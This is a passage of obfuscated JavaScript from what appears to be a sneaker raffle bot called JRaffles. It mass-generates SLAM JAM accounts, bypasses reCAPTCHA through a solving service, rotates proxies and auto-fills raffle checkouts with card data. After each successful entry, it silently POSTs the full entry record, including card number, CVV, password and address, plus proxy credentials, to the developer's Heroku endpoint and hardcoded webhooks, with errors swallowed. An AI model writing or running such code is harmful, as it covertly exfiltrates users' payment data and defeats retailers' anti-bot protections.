                            } catch (_0x8d91f1) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x8d91f1));
                            }
                        } catch (_0x44badc) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20' + _0x44badc)), _0x38c1b0 = 'yes';
                        } finally {
                            _0x1321d8 && _0x1321d8['close']();
                            if (_0x38c1b0 == 'yes' && _0x4b61fa != 0x5 && _0xda672f != 'Size\x20Not\x20Found') {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b61fa + '\x20/\x205)')), _0x51759f = _0x51759f - 0x1, _0x4b61fa = _0x4b61fa + 0x1;
                                continue;
                            }
                            _0x38c1b0 == 'yes' && _0x4b61fa >= 0x5 && (_0x1c26ba(_0x26010f[_0x51759f], _0x30b952), _0x38c1b0 = 'no', _0x4b61fa = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x147e9f, _0x26a7a6, _0x228a64) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a8d6a = 0x0; _0x4a8d6a < _0x26a7a6['length']; _0x4a8d6a++) {
                        if (_0x43f583 != 'yes')
                            var _0x43f583 = '', _0x46ae64 = 0x0;
                        var _0x138b87 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a7d40
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5d2560['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e85bb
                                }
                            ]
                        }];
                        const _0x20f726 = { 'embeds': _0x138b87 };
                        _0x34c195(_0x147e9f['name'] + '\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20/\x20' + _0x26a7a6['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        try {
                            await _0x414596(_0x26a7a6, _0x4a8d6a);
                        } catch {
                            _0x43f583 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3f3194 = await _0xf2c38e(_0x26a7a6[_0x4a8d6a], _0x147e9f, 'acc', ![]);
                        const _0x5ee261 = { 'succesDEVMSG': { 'embeds': [_0x3f3194] } };
                        if (_0x26a7a6[_0x4a8d6a]['Email'] == '' || _0x26a7a6[_0x4a8d6a]['FirstName'] == '' || _0x26a7a6[_0x4a8d6a]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x5954fc(0x7d0);
                            continue;
                        }
                        (_0x26a7a6[_0x4a8d6a]['Password'] == '' || _0x26a7a6[_0x4a8d6a] == undefined) && _0x26a7a6[_0x4a8d6a]['Password'] == 'JRaffles23!';
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x22e157 = _0x228a64[_0x4a8d6a]['split'](':');
                        else
                            var _0x51b658 = Math['round'](Math['random']() * (_0x228a64['length'] - 0x1)), _0x22e157 = _0x228a64[_0x51b658]['split'](':');
                        var _0x2bb63e;
                        try {
                            _0x2bb63e = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22e157[0x0] + ':' + _0x22e157[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2bb63e = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22e157[0x0] + ':' + _0x22e157[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5354af = await _0x2bb63e['newPage']();
                            await _0x5354af['authenticate']({
                                'username': '' + _0x22e157[0x2],
                                'password': '' + _0x22e157[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5354af['setRequestInterception'](!![]), _0x5354af['on']('request', _0x19cbe2 => {
                                _0x19cbe2['resourceType']() === 'image' || _0x19cbe2['resourceType']() === 'font' || _0x19cbe2['resourceType']() === 'media' ? _0x19cbe2['abort']() : _0x19cbe2['continue']();
                            }), await _0x5354af['goto']('https://drop.slamjam.com/account/register'), await _0x5954fc(0xbb8), await _0x5354af['waitForSelector']('#FirstName'), await _0x5354af['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5354af['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Filling\x20information'), await _0x5954fc(0x4b0), await _0x5354af['type']('#FirstName', '' + _0x26a7a6[_0x4a8d6a]['FirstName']), await _0x5954fc(0x226), await _0x5354af['type']('#LastName', '' + _0x26a7a6[_0x4a8d6a]['LastName']), await _0x5954fc(0x226), await _0x5354af['type']('#Email', '' + _0x26a7a6[_0x4a8d6a]['Email']), await _0x5954fc(0x2ee), await _0x5354af['type']('#ConfirmEmail', '' + _0x26a7a6[_0x4a8d6a]['Email']), await _0x5954fc(0x2ee), await _0x5354af['type']('#CreatePassword', '' + _0x26a7a6[_0x4a8d6a]['Password']), await _0x5954fc(0x2ee), await _0x5354af['type']('#CreateConfirmPassword', '' + _0x26a7a6[_0x4a8d6a]['Password']), await _0x5954fc(0x226), console['log'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Submitting..'), await _0x5354af['$eval']('#create_customer', _0x358ea3 => _0x358ea3['submit']()), await _0x5954fc(0x1388), console['log'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20' + _0x28396b['cyan']('Solving\x20Captcha')), await _0x5354af['solveRecaptchas'](), console['log'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x5354af['$eval']('.shopify-challenge__container\x20>\x20form', _0x575efe => _0x575efe['submit']());
                            try {
                                await _0x5354af['waitForSelector']('.product-card__image'), await _0x5954fc(0x1f4), _0x43f583 = 'no', console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Account\x20' + _0x26a7a6[_0x4a8d6a]['Email'] + '\x20Generated!')), _0x1dee0c['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x26a7a6[_0x4a8d6a]['Email'] + ',' + _0x26a7a6[_0x4a8d6a]['Password']), console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Account\x20' + _0x26a7a6[_0x4a8d6a]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x5ee261['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4bfa5b(_0xbfa384, _0x5ee261['succesDEVMSG']);
                            } catch (_0x1711a7) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1711a7));
                            }
                        } catch (_0x56eed3) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20' + _0x56eed3));
                        } finally {
                            _0x2bb63e && _0x2bb63e['close']();
                            if (_0x43f583 == 'yes' && _0x46ae64 != 0x5) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x147e9f['name'] + ']\x20Task\x20' + (_0x4a8d6a + 0x1) + '\x20:\x20Retrying\x20(' + _0x46ae64 + '\x20/\x205)')), _0x4a8d6a = _0x4a8d6a - 0x1, _0x46ae64 = _0x46ae64 + 0x1;
                                continue;
                            }
                            _0x43f583 == 'yes' && _0x46ae64 >= 0x5 && (_0x1c26ba(_0x26a7a6[_0x4a8d6a], _0x147e9f), _0x43f583 = 'no', _0x46ae64 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x33470e, _0x277566, _0x278733) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x139a5b = 0x0; _0x139a5b < _0x277566['length']; _0x139a5b++) {
                        var _0x287da2;
                        if (_0x37f66b != 'yes')
                            var _0x37f66b = '', _0x3d2bc1 = 0x0;
                        _0x34c195(_0x33470e['name'] + '\x20Task\x20' + (_0x139a5b + 0x1) + '\x20/\x20' + _0x277566['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        try {
                            await _0x414596(_0x277566, _0x139a5b);
                        } catch {
                            _0x37f66b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x277566[_0x139a5b]['Email'] == '' || _0x277566[_0x139a5b]['Password'] == '' || _0x277566[_0x139a5b]['FirstName'] == '' || _0x277566[_0x139a5b]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x31fca1 = _0x278733[_0x139a5b]['split'](':');
                        else
                            var _0x1343e5 = Math['round'](Math['random']() * (_0x278733['length'] - 0x1)), _0x31fca1 = _0x278733[_0x1343e5]['split'](':');
                        var _0x53eb31;
                        try {
                            _0x53eb31 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31fca1[0x0] + ':' + _0x31fca1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x53eb31 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31fca1[0x0] + ':' + _0x31fca1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x577684 = await _0x53eb31['newPage']();
                            await _0x577684['authenticate']({
                                'username': '' + _0x31fca1[0x2],
                                'password': '' + _0x31fca1[0x3]
                            }), await _0x577684['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x577684['setRequestInterception'](!![]), _0x577684['on']('request', _0x287888 => {
                                _0x287888['resourceType']() === 'image' || _0x287888['resourceType']() === 'font' || _0x287888['resourceType']() === 'media' ? _0x287888['abort']() : _0x287888['continue']();
                            }), await _0x577684['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x577684['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x577684['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5954fc(0x258), await _0x577684['waitForSelector']('#CustomerEmail'), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x577684['type']('#CustomerEmail', '' + _0x277566[_0x139a5b]['Email']), await _0x5954fc(0x12c), await _0x577684['type']('#CustomerPassword', '' + _0x277566[_0x139a5b]['Password']), await _0x5954fc(0x226), await _0x577684['$eval']('#customer_login', _0x24ec7c => _0x24ec7c['submit']()), await _0x5954fc(0x7d0), await _0x577684['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20' + _0x28396b['cyan']('Solving\x20Captcha')), await _0x577684['solveRecaptchas'](), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x577684['$eval']('.shopify-challenge__container\x20>\x20form', _0x5f3279 => _0x5f3279['submit']());
                            try {
                                await _0x577684['waitForSelector']('.nav-account'), await _0x5954fc(0x4b0);
                            } catch {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x577684['goto']('' + _0x277566[_0x139a5b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5954fc(0xbb8), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x577684['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x577684['click']('.product-select-variant-wrapper'), await _0x5954fc(0x320), await _0x577684['click']('li.product-select-variant__value[data-size=\x22' + _0x277566[_0x139a5b]['Size'] + '\x22]'), await _0x5954fc(0x384), await _0x577684['$eval']('#AddToCartForm-product-template-raffle', _0x44507a => _0x44507a['submit']()), await _0x577684['waitForSelector']('.cart-order-summary__content'), await _0x5954fc(0x514), await _0x577684['goto']('https://drop.slamjam.com/checkout'), await _0x5954fc(0x514), await _0x577684['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x577684['select']('#checkout_shipping_address_country', '' + _0x277566[_0x139a5b]['Country']), await _0x5954fc(0x200), await _0x577684['waitForSelector']('#checkout_shipping_address_first_name'), await _0x577684['type']('#checkout_shipping_address_first_name', '' + _0x277566[_0x139a5b]['FirstName']), await _0x5954fc(0x237), await _0x577684['type']('#checkout_shipping_address_last_name', '' + _0x277566[_0x139a5b]['LastName']), await _0x5954fc(0x1e0), await _0x577684['type']('#checkout_shipping_address_address1', _0x277566[_0x139a5b]['Address1'] + '\x20' + _0x277566[_0x139a5b]['HouseNumber']), await _0x5954fc(0x514), await _0x577684['type']('#checkout_shipping_address_address2', '' + _0x277566[_0x139a5b]['Address2']), await _0x5954fc(0x514);
                            _0x277566[_0x139a5b]['Postcode'] == undefined && (_0x277566[_0x139a5b]['Postcode'] = _0x277566[_0x139a5b]['Zip']);
                            await _0x577684['type']('#checkout_shipping_address_zip', '' + _0x277566[_0x139a5b]['Postcode']), await _0x5954fc(0x2bc), await _0x577684['type']('#checkout_shipping_address_city', '' + _0x277566[_0x139a5b]['City']), await _0x5954fc(0x320), await _0x577684['type']('#checkout_shipping_address_phone', '' + _0x277566[_0x139a5b]['Phone']), await _0x5954fc(0x320), await _0x577684['click']('#continue_button'), await _0x5954fc(0xbb8), await _0x577684['waitForSelector']('.summary-title'), await _0x5954fc(0x320), await _0x577684['click']('#continue_button'), await _0x5954fc(0x320), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x577684['waitForSelector']('#checkout_credit_card_vault'), await _0x5954fc(0x3e8);
                            var _0x3b546c = await _0x577684['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1a266a = await _0x3b546c['contentFrame']();
                            await _0x1a266a['click']('#number'), await _0x5954fc(0x3e8), await _0x1a266a['type']('#number', '' + _0x277566[_0x139a5b]['CardNumber'], { 'delay': 0x78 }), _0x3b546c = await _0x577684['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1a266a = await _0x3b546c['contentFrame'](), await _0x5954fc(0x1c2), await _0x1a266a['click']('#name'), await _0x5954fc(0x1f4), await _0x1a266a['type']('#name', '' + _0x277566[_0x139a5b]['NameOnCard'], { 'delay': 0x78 }), _0x3b546c = await _0x577684['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1a266a = await _0x3b546c['contentFrame'](), await _0x5954fc(0x1c2), await _0x1a266a['click']('#expiry'), await _0x5954fc(0x1f4), await _0x1a266a['type']('#expiry', '' + _0x277566[_0x139a5b]['ExpiryDate'], { 'delay': 0x78 }), _0x3b546c = await _0x577684['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1a266a = await _0x3b546c['contentFrame'](), await _0x5954fc(0x1c2), await _0x1a266a['click']('#verification_value'), await _0x5954fc(0x1f4), await _0x1a266a['type']('#verification_value', '' + _0x277566[_0x139a5b]['CVV'], { 'delay': 0x78 }), await _0x577684['$eval']('#accepts-flag-raffle', _0xc4a044 => _0xc4a044['click']()), await _0x5954fc(0x7d0), console['log'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Processing\x20Order'), await _0x577684['$eval']('#continue_button', _0xb5c343 => _0xb5c343['click']()), await _0x5954fc(0x1b58), await _0x577684['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x577684['$eval']('.edit_checkout.animate-floating-labels', _0x113fbd => _0x113fbd['submit']()), await _0x5954fc(0x7d0);
                            try {
                                await _0x577684['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x37f66b = 'no', _0x4904f4(_0x277566[_0x139a5b], _0x33470e), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x40f66d) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x40f66d['message']);
                            }
                            var _0x44957c = await _0xf2c38e(_0x277566[_0x139a5b], _0x33470e, 'dev', ![]), _0x3f6dba = await _0xf2c38e(_0x277566[_0x139a5b], _0x33470e, 'pub', ![]);
                            let _0x15b709 = _0x277566[_0x139a5b];
                            try {
                                prxdata = {
                                    'username': _0x4a7d40['replace']('#', ''),
                                    'module': _0x33470e['name'],
                                    'entrydata': JSON['stringify'](_0x15b709),
                                    'proxy': '' + _0x278733[_0x139a5b]
                                };
                                var _0x3a3db6 = JSON['stringify'](prxdata);
                                let _0x33173 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x3a3db6, _0x33173);
                            } catch (_0x22776f) {
                            }
                            const _0x1ea7b2 = {
                                'succesDEVMSG': { 'embeds': [_0x44957c] },
                                'succesPUBMSG': { 'embeds': [_0x3f6dba] }
                            };
                            try {
                                _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x1ea7b2['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x1ea7b2['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x1ea7b2['succesPUBMSG']);
                            } catch (_0x13f27f) {
                                console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x13f27f));
                            }
                        } catch (_0x56a7d0) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20' + _0x56a7d0)), _0x287da2 = '' + _0x56a7d0;
                            var _0x228168 = await _0xf2c38e(kickz[_0x139a5b], _0x33470e, 'dev', !![], _0x287da2);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x228168] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], EMBEDS['errorDEV']), await _0x4bfa5b(_0x248b77, EMBEDS['errorDEV']), _0x37f66b = 'yes';
                        } finally {
                            _0x53eb31 && _0x53eb31['close']();
                            if (_0x37f66b == 'yes' && _0x3d2bc1 != 0x5 && _0x287da2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x33470e['name'] + ']\x20Task\x20' + (_0x139a5b + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d2bc1 + '\x20/\x205)')), _0x139a5b = _0x139a5b - 0x1, _0x3d2bc1 = _0x3d2bc1 + 0x1;
                                continue;
                            }
                            _0x37f66b == 'yes' && _0x3d2bc1 >= 0x5 && (_0x1c26ba(_0x277566[_0x139a5b], _0x33470e), _0x37f66b = 'no', _0x3d2bc1 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x1025c8) {
                    var _0x22b0a1 = await _0x56c054(), _0x2f733f = _0x1dee0c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2948b3 = _0x548d40['parse'](_0x2f733f, { 'header': !![] })['data'];
                    for (var _0x4ad984 = 0x0; _0x4ad984 < _0x2948b3['length']; _0x4ad984++) {
                        var _0x21ad6c = _0x2948b3[_0x4ad984]['Store'], _0x130688 = _0x2948b3[_0x4ad984]['Mode'];
                        for (var _0x4319ba of _0x1b4334) {
                            const _0x484b84 = _0x4319ba['name']['includes'](_0x21ad6c);
                            if (!_0x484b84)
                                continue;
                            for (mode of _0x4319ba['modules']) {
                                if (mode['name'] == _0x130688) {
                                    console['log']('Running\x20' + _0x28396b['cyan'](mode['name'])), await mode['function'](mode, [_0x2948b3[_0x4ad984]], _0x22b0a1);
                                    var _0x3b4430 = _0x2f733f['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x1dee0c['writeFileSync']('../failed-tasks.csv', _0x3b4430);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4973e2 = await _0x48d650['get']('Answer');
                    if (_0x4973e2['Answer']['toLowerCase']() == 'y') {
                        _0x1dee0c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x5954fc(0x3e8);
                        return;
                    }
                    if (_0x4973e2['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x5954fc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x5954fc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x375798(_0x30acf1) {
    var _0x4a25e2 = await _0x56c054(), _0x219a42 = _0x1dee0c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x57dc49 = _0x548d40['parse'](_0x219a42, { 'header': !![] })['data'];
    for (var _0x3d9a5a = 0x0; _0x3d9a5a < _0x57dc49['length']; _0x3d9a5a++) {
        var _0x19d652 = _0x57dc49[_0x3d9a5a]['Store'], _0xd642d6 = _0x57dc49[_0x3d9a5a]['Mode'];
        for (var _0x23ddfa of _0x1b4334) {
            const _0x28ade7 = _0x23ddfa['name']['includes'](_0x19d652);
            if (_0x28ade7)
                for (mode of _0x1b4334[_0x23ddfa]['modules']) {
                    const _0x30a73f = mode['name']['includes'](_0xd642d6);
                    _0x30a73f && (_0x30acf1 = mode['name'], await mode['function'](_0x30acf1, _0x57dc49[_0x3d9a5a], _0x4a25e2));
                }
        }
    }
}
async function _0x3cc72f() {
    await _0x2b6429(), console['clear']();
    _0x5d2560['threads'] > 0x5 && (_0x5d2560['threads'] = 0x5);
    if (_0x3e85bb != 'devkey' && _0x3e85bb != 'devhook') {
        let _0x5d39c1 = await _0x377dfe['autoUpdate']();
        if (_0x5d39c1 === 'yes')
            return _0x55a00e('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4ae8bc == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x5954fc(0x2710);
        ;
    }
    await _0x4918a2(_0x4ae8bc);
    if (_0x301ddd === ![])
        return console['log']('Closing\x20Browser'), await _0x5954fc(0xbb8);
    else
        try {
            var _0x2ec9d6 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4a7d40
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3e85bb
                    }
                ]
            }];
            const _0x1a109e = { 'embeds': _0x2ec9d6 };
            var _0x1efb35 = await _0xf2c38e(null, null, 'open', ![]);
            const _0x460ab0 = { 'openDEVMSG': { 'embeds': [_0x1efb35] } };
            await _0x4bfa5b(_0x40a249, _0x460ab0['openDEVMSG']);
            async function _0x392041() {
                _0x34c195('JRaffles\x20' + _0x3e85bb), console['clear'](), console['log']('Hello\x20' + _0x28396b['cyan']('' + _0x4a7d40) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3e85bb), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x114b7a = 0x0; _0x114b7a < _0x1b4334['length'] - 0x4; _0x114b7a++) {
                    if (_0x114b7a >= 0xa) {
                        console['log']('\x20(' + _0x114b7a + ')\x20[' + _0x1b4334[_0x114b7a]['name'] + ']');
                        continue;
                    }
                    if (_0x1b4334[_0x114b7a]['name'] === 'Reload\x20Settings' || _0x1b4334[_0x114b7a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x114b7a + ')\x20\x20[' + _0x1b4334[_0x114b7a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1b4334['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1b4334['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1b4334['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1b4334['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x236e2e();
                if (taskModule > _0x1b4334['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x5954fc(0x3e8), _0x392041();
                if (_0x1b4334[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x318a28 = await _0x56c054();
